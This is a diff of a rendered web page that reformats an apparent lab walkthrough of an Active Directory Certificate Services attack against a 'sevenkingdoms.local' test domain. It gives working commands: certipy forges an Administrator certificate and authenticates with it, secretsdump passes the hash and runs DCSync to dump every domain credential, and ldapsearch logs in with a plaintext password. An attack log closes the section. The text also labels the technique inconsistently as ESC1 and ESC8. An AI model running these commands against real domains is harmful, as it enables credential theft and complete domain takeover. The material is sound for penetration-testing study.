-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">certipy req </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">-</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">u TestUser</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">@sevenkingdoms</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">local</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">-</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">p </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&#x27;Password123!&#x27;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">-</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">dc</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">-</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">ip </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">192.168</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.56</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.10</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">-</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">ca SEVENKINGDOMS</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">-</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">CA \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">-</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">target kingslanding.sevenkingdoms.local \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">-</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">template ESC1 \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">-</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">upn Administrator</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">@sevenkingdoms</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">local</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">certipy req -u TestUser@sevenkingdoms.local \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -p &#x27;Password123!&#x27; \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -dc-ip 192.168.56.10 \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -ca SEVENKINGDOMS-CA \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -target kingslanding.sevenkingdoms.local \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -template ESC1 \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -upn Administrator@sevenkingdoms.local</span><br></div></code></pre></div></div>
 <p><strong>Parameters Explained:</strong></p>
 <ul>
 <li class="">
-<p><code>-u</code>- Username for authentication</p>
+<p><code>-u</code> - Username for authentication</p>
 </li>
 <li class="">
-<p><code>-p</code>- Password for authentication</p>
+<p><code>-p</code> - Password for authentication</p>
 </li>
 <li class="">
-<p><code>-dc-ip</code>- Domain Controller IP address</p>
+<p><code>-dc-ip</code> - Domain Controller IP address</p>
 </li>
 <li class="">
-<p><code>-ca</code>- Certificate Authority name</p>
+<p><code>-ca</code> - Certificate Authority name</p>
 </li>
 <li class="">
-<p><code>-target</code>- ADCS server hostname</p>
+<p><code>-target</code> - ADCS server hostname</p>
 </li>
 <li class="">
-<p><code>-template</code>- Certificate template to use</p>
+<p><code>-template</code> - Certificate template to use</p>
 </li>
 <li class="">
-<p><code>-upn</code>- User Principal Name for the certificate (target account)</p>
+<p><code>-upn</code> - User Principal Name for the certificate (target account)</p>
 </li>
 </ul>
 <p><strong>Expected Output:</strong></p>
@@ -758,7 +758,7 @@ The account is<strong>disabled / locked / revoked</strong>, so KDC refuses it.</
 <p><strong>Result:</strong></p>
 <ul>
 <li class="">
-<p>✅ Certificate obtained:<code>administrator.pfx</code></p>
+<p>✅ Certificate obtained: <code>administrator.pfx</code></p>
 </li>
 <li class="">
 <p>✅ Certificate contains Administrator UPN</p>
@@ -768,9 +768,9 @@ The account is<strong>disabled / locked / revoked</strong>, so KDC refuses it.</
 </li>
 </ul>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="step-22-verify-certificate-contents">Step 2.2: Verify Certificate Contents<a href="#step-22-verify-certificate-contents" class="hash-link" aria-label="Direct link to Step 2.2: Verify Certificate Contents" title="Direct link to Step 2.2: Verify Certificate Contents" translate="no">​</a></h3>
-<p>**Objective:**Confirm the certificate is valid and contains the expected information.</p>
+<p><strong>Objective:</strong> Confirm the certificate is valid and contains the expected information.</p>
 <p><strong>Command:</strong></p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">certipy cert -pfx administrator.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">pfx</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> -nokey</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">certipy cert -pfx administrator.pfx -nokey</span><br></div></code></pre></div></div>
 <p><strong>What to Check:</strong></p>
 <ul>
 <li class="">
@@ -789,9 +789,9 @@ The account is<strong>disabled / locked / revoked</strong>, so KDC refuses it.</
 <img src="https://cdn-images-1.medium.com/max/800/1*urkdv2aGaE2vqOFa9nEHjw.png" alt="Article image" width="1017" height="846" loading="lazy" decoding="async">
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="phase-3-certificate-based-authentication">Phase 3: Certificate-Based Authentication<a href="#phase-3-certificate-based-authentication" class="hash-link" aria-label="Direct link to Phase 3: Certificate-Based Authentication" title="Direct link to Phase 3: Certificate-Based Authentication" translate="no">​</a></h2>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="step-31-authenticate-using-certificate">Step 3.1: Authenticate Using Certificate<a href="#step-31-authenticate-using-certificate" class="hash-link" aria-label="Direct link to Step 3.1: Authenticate Using Certificate" title="Direct link to Step 3.1: Authenticate Using Certificate" translate="no">​</a></h3>
-<p>**Objective:**Use the certificate to obtain Kerberos credentials.</p>
+<p><strong>Objective:</strong> Use the certificate to obtain Kerberos credentials.</p>
 <p><strong>Command:</strong></p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">certipy auth -pfx administrator.pfx \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -dc-ip </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">192.168</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.56</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.10</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -username Administrator \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -domain sevenkingdoms.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">local</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">certipy auth -pfx administrator.pfx \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -dc-ip 192.168.56.10 \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -username Administrator \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -domain sevenkingdoms.local</span><br></div></code></pre></div></div>
 <p><strong>What Happens:</strong></p>
 <ul>
 <li class="">
@@ -815,16 +815,16 @@ The account is<strong>disabled / locked / revoked</strong>, so KDC refuses it.</
 <p>✅ Kerberos TGT obtained</p>
 </li>
 <li class="">
-<p>✅ NT hash extracted:<code>c66d72021a2d4744409969a581a1705e</code></p>
+<p>✅ NT hash extracted: <code>c66d72021a2d4744409969a581a1705e</code></p>
 </li>
 <li class="">
-<p>✅ Credential cache saved:<code>administrator.ccache</code></p>
+<p>✅ Credential cache saved: <code>administrator.ccache</code></p>
 </li>
 </ul>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="step-32-verify-authentication">Step 3.2: Verify Authentication<a href="#step-32-verify-authentication" class="hash-link" aria-label="Direct link to Step 3.2: Verify Authentication" title="Direct link to Step 3.2: Verify Authentication" translate="no">​</a></h3>
-<p>**Objective:**Confirm you can authenticate as the target account.</p>
+<p><strong>Objective:</strong> Confirm you can authenticate as the target account.</p>
 <p><strong>Test Command:</strong></p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain"># Use the NT hash for authentication</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">secretsdump.py -dc-ip </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">192.168</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">56.10</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -hashes </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">:c66d72021a2d4744409969a581a1705e</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  sevenkingdoms.local/</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Administrator</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">@192</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">168.56</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">10</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -just-dc-user </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Administrator</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain"># Use the NT hash for authentication</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">secretsdump.py -dc-ip 192.168.56.10 \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -hashes :c66d72021a2d4744409969a581a1705e \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  sevenkingdoms.local/Administrator@192.168.56.10 \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -just-dc-user Administrator</span><br></div></code></pre></div></div>
 <p><strong>Expected Output:</strong></p>
 <img src="https://cdn-images-1.medium.com/max/800/1*e4IrqWvQ3Z6qDcMy1NjeBQ.png" alt="Article image" width="1301" height="369" loading="lazy" decoding="async">
 <p><strong>Success Indicators:</strong></p>
@@ -841,9 +841,9 @@ The account is<strong>disabled / locked / revoked</strong>, so KDC refuses it.</
 </ul>
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="phase-4-domain-compromise">Phase 4: Domain Compromise<a href="#phase-4-domain-compromise" class="hash-link" aria-label="Direct link to Phase 4: Domain Compromise" title="Direct link to Phase 4: Domain Compromise" translate="no">​</a></h2>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="step-41-perform-dcsync-attack">Step 4.1: Perform DCSync Attack<a href="#step-41-perform-dcsync-attack" class="hash-link" aria-label="Direct link to Step 4.1: Perform DCSync Attack" title="Direct link to Step 4.1: Perform DCSync Attack" translate="no">​</a></h3>
-<p>**Objective:**Extract all domain credentials using DCSync.</p>
+<p><strong>Objective:</strong> Extract all domain credentials using DCSync.</p>
 <p><strong>Command:</strong></p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">secretsdump.py -dc-ip </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">192.168</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">56.10</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -hashes </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">:c66d72021a2d4744409969a581a1705e</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  sevenkingdoms.local/</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Administrator</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">@192</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">168.56</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">10</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -just-dc</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">secretsdump.py -dc-ip 192.168.56.10 \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -hashes :c66d72021a2d4744409969a581a1705e \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  sevenkingdoms.local/Administrator@192.168.56.10 \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -just-dc</span><br></div></code></pre></div></div>
 <p><strong>What This Does:</strong></p>
 <ul>
 <li class="">
@@ -876,13 +876,13 @@ The account is<strong>disabled / locked / revoked</strong>, so KDC refuses it.</
 <p>✅ Kerberos keys extracted</p>
 </li>
 <li class="">
-<p>✅<strong>Complete domain compromise achieved</strong></p>
+<p>✅ <strong>Complete domain compromise achieved</strong></p>
 </li>
 </ul>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="step-42-verify-domain-compromise">Step 4.2: Verify Domain Compromise<a href="#step-42-verify-domain-compromise" class="hash-link" aria-label="Direct link to Step 4.2: Verify Domain Compromise" title="Direct link to Step 4.2: Verify Domain Compromise" translate="no">​</a></h3>
-<p>**Objective:**Confirm you have complete domain control.</p>
+<p><strong>Objective:</strong> Confirm you have complete domain control.</p>
 <p><strong>Test Commands:</strong></p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain"># List all domain users</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">ldapsearch -</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">x</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> -H ldap:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">//</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">192.168</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">56.10</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -D </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;CN=Administrator,CN=Users,DC=sevenkingdoms,DC=local&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -w </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;8dCT-DJjgScp&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -b </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;CN=Users,DC=sevenkingdoms,DC=local&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;(objectClass=user)&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> sAMAccountName</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"># Create a test user (proves domain admin)</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"># (Only if you want to demonstrate full control)</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain"># List all domain users</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">ldapsearch -x -H ldap://192.168.56.10 \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -D &quot;CN=Administrator,CN=Users,DC=sevenkingdoms,DC=local&quot; \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -w &quot;8dCT-DJjgScp&quot; \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -b &quot;CN=Users,DC=sevenkingdoms,DC=local&quot; \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  &quot;(objectClass=user)&quot; sAMAccountName</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"># Create a test user (proves domain admin)</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"># (Only if you want to demonstrate full control)</span><br></div></code></pre></div></div>
 <img src="https://cdn-images-1.medium.com/max/800/1*9XigbXY1nCmTORhO0xZs5A.png" alt="Article image" width="1263" height="915" loading="lazy" decoding="async">
 <p><strong>Success Indicators:</strong></p>
 <ul>
@@ -901,34 +901,34 @@ The account is<strong>disabled / locked / revoked</strong>, so KDC refuses it.</
 </ul>
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="attack-execution">Attack Execution<a href="#attack-execution" class="hash-link" aria-label="Direct link to Attack Execution" title="Direct link to Attack Execution" translate="no">​</a></h2>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="complete-attack-timeline">Complete Attack Timeline<a href="#complete-attack-timeline" class="hash-link" aria-label="Direct link to Complete Attack Timeline" title="Direct link to Complete Attack Timeline" translate="no">​</a></h3>
-<p><strong>Time:</strong>~15–30 minutes (depending on environment)</p>
+<p><strong>Time:</strong> ~15–30 minutes (depending on environment)</p>
 <p><strong>Steps Summary:</strong></p>
 <ul>
 <li class="">
-<p><strong>Reconnaissance</strong>(5 min) — Discover ADCS, verify ESC8</p>
+<p><strong>Reconnaissance</strong> (5 min) — Discover ADCS, verify ESC8</p>
 </li>
 <li class="">
-<p><strong>Certificate Request</strong>(2 min) — Obtain certificate</p>
+<p><strong>Certificate Request</strong> (2 min) — Obtain certificate</p>
 </li>
 <li class="">
-<p><strong>Authentication</strong>(1 min) — Get Kerberos credentials</p>
+<p><strong>Authentication</strong> (1 min) — Get Kerberos credentials</p>
 </li>
 <li class="">
-<p><strong>Domain Compromise</strong>(5 min) — DCSync all credentials</p>
+<p><strong>Domain Compromise</strong> (5 min) — DCSync all credentials</p>
 </li>
 <li class="">
-<p><strong>Verification</strong>(2 min) — Confirm access</p>
+<p><strong>Verification</strong> (2 min) — Confirm access</p>
 </li>
 </ul>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="real-attack-execution-log">Real Attack Execution Log<a href="#real-attack-execution-log" class="hash-link" aria-label="Direct link to Real Attack Execution Log" title="Direct link to Real Attack Execution Log" translate="no">​</a></h3>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">[11:50:00]</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Starting</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">ADCS</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">ESC8</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Attack</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">[11:50:15]</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> ✓ </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">ADCS</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">discovered</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">: </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">SEVENKINGDOMS-CA</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">[11:50:20]</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> ✓ </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">ESC8</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">vulnerability</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">confirmed</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">[11:51:00]</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> ✓ </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Certificate</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">requested</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">: </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">administrator</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.pfx</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">[11:51:30]</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> ✓ </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Kerberos</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">TGT</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">obtained</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">[11:51:35]</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> ✓ </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">NT</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">hash</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">extracted</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">: </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">c66d72021a2d4744409969a581a1705e</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">[11:52:00]</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> ✓ </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">DCSync</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">executed</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">[11:52:30]</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> ✓ </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">All</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">27</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">user</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">hashes</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">extracted</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">[11:52:35]</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> ✓ </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">krbtgt</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">hash</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">obtained</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">[11:53:00]</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> ✓ </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Domain</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">compromise</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">complete</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">[11:50:00] Starting ADCS ESC8 Attack</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">[11:50:15] ✓ ADCS discovered: SEVENKINGDOMS-CA</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">[11:50:20] ✓ ESC8 vulnerability confirmed</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">[11:51:00] ✓ Certificate requested: administrator.pfx</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">[11:51:30] ✓ Kerberos TGT obtained</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">[11:51:35] ✓ NT hash extracted: c66d72021a2d4744409969a581a1705e</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">[11:52:00] ✓ DCSync executed</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">[11:52:30] ✓ All 27 user hashes extracted</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">[11:52:35] ✓ krbtgt hash obtained</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">[11:53:00] ✓ Domain compromise complete</span><br></div></code></pre></div></div>
